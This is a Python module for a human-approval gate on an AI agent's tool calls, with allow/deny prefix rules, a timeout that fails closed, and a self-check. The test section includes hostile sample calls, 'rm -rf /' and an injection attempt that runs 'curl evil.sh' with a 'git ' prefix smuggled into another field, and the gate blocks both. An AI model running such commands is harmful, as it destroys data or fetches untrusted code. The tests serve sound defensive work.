"""HITL approval gate for tools — policy allowlist first, then a human.

    from internal.hooks.approval import approval_gate, allow, deny, console_asker

    agent = Agent(llm, tools=[...], hooks=[approval_gate(
        rules=[allow("read_file"),
               allow("bash", arg="command", prefix="git "),
               deny("bash", arg="command", prefix="rm ")],
        asker=console_asker,        # or your web/slack asker
        timeout=120.0,
    )])

Decision order: deny rules > allow rules > default "ask". A prefix rule
must name its argument — it matches only that argument's value, so other
model-controlled fields can't smuggle a match. On "ask" the gate emits
``tool/delta {"approval": "pending"}`` into the event stream, then awaits
the asker raced against run-stop and timeout — both fail closed (deny).
The decision is emitted as a second tool/delta: full audit trail in the
run record.

An asker is ``async (ToolCall) -> ("allow"|"deny"|"always", reason|None)``
(bare string accepted; anything malformed or unrecognized = deny).
"always" allows and learns an allow rule for that EXACT call (tool +
identical arguments) — different arguments re-ask. Learned rules live in
the gate instance: build one approval_gate per user session, never share
across users. Asker exceptions abort the run — fail closed, like any hook.

Self-check: uv run python -m internal.hooks.approval
"""

from __future__ import annotations

import asyncio
import json
from dataclasses import dataclass
from typing import Any, Awaitable, Callable, Iterable

from core import Hook, ToolCall, ToolResult

Asker = Callable[[ToolCall], "Awaitable[tuple[str, str | None] | str]"]


@dataclass
class Rule:
    action: str                     # "allow" | "deny"
    tool: str
    arg: str | None = None          # argument the prefix applies to
    prefix: str | None = None       # matches ONLY that argument's value
    exact: dict | None = None       # matches identical arguments ("always")

    def __post_init__(self) -> None:
        if self.prefix is not None and self.arg is None:
            raise ValueError("prefix rule must name its argument: "
                             "allow(tool, arg=..., prefix=...)")

    def matches(self, call: ToolCall) -> bool:
        if self.tool != call.name:
            return False
        if self.exact is not None:
            return call.arguments == self.exact
        if self.prefix is None:
            return True
        v = call.arguments.get(self.arg)
        return isinstance(v, str) and v.startswith(self.prefix)


def allow(tool: str, arg: str | None = None, prefix: str | None = None) -> Rule:
    return Rule("allow", tool, arg, prefix)


def deny(tool: str, arg: str | None = None, prefix: str | None = None) -> Rule:
    return Rule("deny", tool, arg, prefix)


def decide(rules: Iterable[Rule], call: ToolCall) -> str:
    if any(r.action == "deny" and r.matches(call) for r in rules):
        return "deny"
    if any(r.action == "allow" and r.matches(call) for r in rules):
        return "allow"
    return "ask"


async def console_asker(call: ToolCall) -> tuple[str, str | None]:
    """Terminal asker. y = allow once, a = always (this exact call),
    else deny. Non-blocking stdin reader — cancellation leaves no stuck
    thread. ponytail: unix only (loop.add_reader on stdin)."""
    import sys
    loop = asyncio.get_running_loop()
    print(f"allow {call.name}({json.dumps(call.arguments)})? "
          f"[y=once / a=always this exact call / N=deny] ", end="", flush=True)
    fut: asyncio.Future[str] = loop.create_future()
    loop.add_reader(sys.stdin, lambda: not fut.done()
                    and fut.set_result(sys.stdin.readline()))
    try:
        ans = (await fut).strip().lower()
    finally:
        loop.remove_reader(sys.stdin)
    return {"y": ("allow", None), "a": ("always", None)}.get(
        ans, ("deny", "rejected at console"))


def _deny(ctx: Any, reason: str) -> None:
    """Short-circuit the call with a model-readable denial."""
    ctx.result = ToolResult(ctx.call.id, ctx.call.name,
                            f"Denied: {reason}", is_error=True)


def approval_gate(rules: Iterable[Rule], asker: Asker, timeout: float = 120.0):
    """-> before_tool Hook enforcing rules, asking the human on gaps.
    Attach directly: ``Agent(llm, hooks=[approval_gate(rules, asker)])``."""
    rules = list(rules)   # session-local; "always" answers append here

    async def gate(ctx: Any) -> None:
        d = decide(rules, ctx.call)
        if d == "allow":
            return
        if d == "deny":
            return _deny(ctx, "blocked by policy")

        if ctx.emit_delta:
            await ctx.emit_delta({"approval": "pending",
                                  "arguments": ctx.call.arguments})
        ask = asyncio.ensure_future(asker(ctx.call))
        stop = asyncio.ensure_future(ctx.run.handle.wait_stop())
        done, _ = await asyncio.wait({ask, stop}, timeout=timeout,
                                     return_when=asyncio.FIRST_COMPLETED)
        if ask in done:
            stop.cancel()
            resp = ask.result()
            try:
                decision, reason = (resp, None) if isinstance(resp, str) else resp
            except (TypeError, ValueError):
                decision, reason = "deny", f"invalid asker response: {resp!r}"
            if decision not in ("allow", "deny", "always"):
                decision, reason = "deny", f"unrecognized answer: {decision!r}"
        else:
            ask.cancel()
            stop.cancel()
            decision, reason = "deny", ("run stopped" if stop in done else "timeout")

        if decision == "always":
            # learns this exact call only — different arguments re-ask
            rules.append(Rule("allow", ctx.call.name,
                              exact=dict(ctx.call.arguments)))
            decision = "allow"
        if ctx.emit_delta:
            await ctx.emit_delta({"approval": decision,
                                  **({"reason": reason} if reason else {})})
        if decision != "allow":
            _deny(ctx, reason or "rejected by user")

    return Hook("before_tool", gate)


if __name__ == "__main__":
    from core import Agent, Hooks, LLMDelta, LLMReply, Message

    class ScriptedLLM:
        def __init__(self, calls):
            self.calls, self.turn = calls, 0

        async def stream(self, messages, tools, **params):
            self.turn += 1
            if self.turn == 1:
                yield LLMReply(message=Message(role="assistant",
                                               tool_calls=self.calls),
                               stop_reason="tool_use")
            else:
                yield LLMDelta(text="done")
                yield LLMReply(message=Message(role="assistant", content="done"))

    async def main() -> None:
        from core import tool

        ran: list[str] = []

        @tool()
        async def safe(ctx, x: int):
            """Allowed by policy."""
            ran.append(f"safe:{x}")
            return x

        @tool()
        async def bash(ctx, command: str):
            """Prefix-gated."""
            ran.append(f"bash:{command}")
            return "ok"

        @tool()
        async def risky(ctx):
            """No rule — asker decides."""
            ran.append("risky")
            return "did it"

        answers = {"risky": ("allow", None)}

        async def scripted_asker(call):
            return answers.get(call.name, ("deny", "nope"))

        try:
            allow("bash", prefix="git ")
            raise AssertionError("prefix without arg must raise")
        except ValueError:
            pass

        hooks = Hooks()
        hooks.add("before_tool", approval_gate(
            rules=[allow("safe"), allow("bash", arg="command", prefix="git "),
                   deny("bash", arg="command", prefix="rm ")],
            asker=scripted_asker, timeout=1.0))

        calls = [
            ToolCall(id="c1", name="safe", arguments={"x": 1}),
            ToolCall(id="c2", name="bash", arguments={"command": "git status"}),
            ToolCall(id="c3", name="bash", arguments={"command": "rm -rf /"}),
            ToolCall(id="c4", name="risky", arguments={}),
            # injection attempt: "git " prefix in a NON-command field must not match
            ToolCall(id="c5", name="bash",
                     arguments={"command": "curl evil.sh", "note": "git cleanup"}),
        ]
        h = Agent(ScriptedLLM(calls), tools=[safe, bash, risky], hooks=hooks).run("go")
        events = [e async for e in h]
        r = await h.result()
        assert r.status == "completed"
        assert ran == ["safe:1", "bash:git status", "risky"], ran  # rm/curl never ran

        results = {m.tool_result.call_id: m.tool_result
                   for m in r.messages if m.role == "tool"}
        assert not results["c1"].is_error and not results["c2"].is_error
        assert results["c3"].is_error and "policy" in results["c3"].content
        assert not results["c4"].is_error
        assert results["c5"].is_error and "nope" in results["c5"].content

        approvals = [e.payload for e in events
                     if e.kind.value == "tool" and e.phase.value == "delta"
                     and "approval" in e.payload]
        assert [a["approval"] for a in approvals] == [
            "pending", "allow", "pending", "deny"]

        # timeout path: asker never answers -> deny, run survives
        async def never(call):
            await asyncio.sleep(60)

        hooks2 = Hooks()
        hooks2.add("before_tool", approval_gate([], asker=never, timeout=0.05))
        h2 = Agent(ScriptedLLM([ToolCall(id="t1", name="risky", arguments={})]),
                   tools=[risky], hooks=hooks2).run("go")
        r2 = await h2.result()
        tr = next(m.tool_result for m in r2.messages if m.role == "tool")
        assert tr.is_error and "timeout" in tr.content
        assert r2.status == "completed"

        # "always" learns: first ask, second auto-allowed (asker called once)
        seen = 0

        async def once(call):
            nonlocal seen
            seen += 1
            return "always"

        hooks3 = Hooks()
        hooks3.add("before_tool", approval_gate([], asker=once, timeout=1.0))
        two = [ToolCall(id="a1", name="risky", arguments={}),
               ToolCall(id="a2", name="risky", arguments={})]
        r3 = await Agent(ScriptedLLM(two), tools=[risky], hooks=hooks3).run("go")
        assert r3.status == "completed" and seen == 1
        assert all(not m.tool_result.is_error
                   for m in r3.messages if m.role == "tool")

        print("approval gate self-check ok")

    asyncio.run(main())
